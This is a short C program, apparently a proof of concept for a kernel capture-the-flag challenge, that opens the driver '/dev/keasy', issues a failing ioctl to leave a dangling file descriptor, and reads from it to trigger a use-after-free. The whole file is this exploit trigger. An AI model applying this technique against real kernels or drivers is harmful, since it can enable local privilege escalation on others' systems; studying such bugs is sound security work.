#include <fcntl.h> // open function
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h> // ioctl function
#include <unistd.h>    // read function

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
    // 调用dev
    int fd = open("/dev/keasy", O_RDWR);
    if  (fd == -1)
        fatal("open /dev/keasy fail");

    // 获取悬空文件描述符
    int ezfd = fd + 1;
    if (ioctl(fd, 0, 0xaabbccdd) == 0)
        fatal("ioctl did not fail");

    // UAF
    char buf[4];
    read(ezfd, buf, 4);
    return 0;
}